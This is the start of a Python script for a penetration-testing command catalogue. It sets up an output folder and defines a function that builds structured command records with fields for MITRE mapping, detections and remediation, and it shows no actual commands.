#!/usr/bin/env python3
"""
VAPT Command Generator — Hybrid approach.
Generates structured command entries from compact template definitions.
Each generated entry follows the exact same schema as hand-written ones.

Run: python scripts/generate_commands.py
"""

import json
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent.parent / "data" / "commands"
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)


def make_entry(id, tool, cat, phase, os_list, cmd, name, desc, args, output,
               use_case, prereqs, mitre, tactic, detections, remediation,
               mistakes, alts, refs, tags):
    return {
        "id": id, "tool": tool, "category": cat, "phase": phase, "os": os_list,
        "command": cmd, "name": name, "description": desc, "arguments": args,
        "expected_output": output, "use_case": use_case, "prerequisites": prereqs,
        "mitre_mapping": mitre, "mitre_tactic": tactic, "detections": detections,
        "remediation": remediation, "common_mistakes": mistakes,
        "alternatives": alts, "references": refs, "tags": tags,
    }


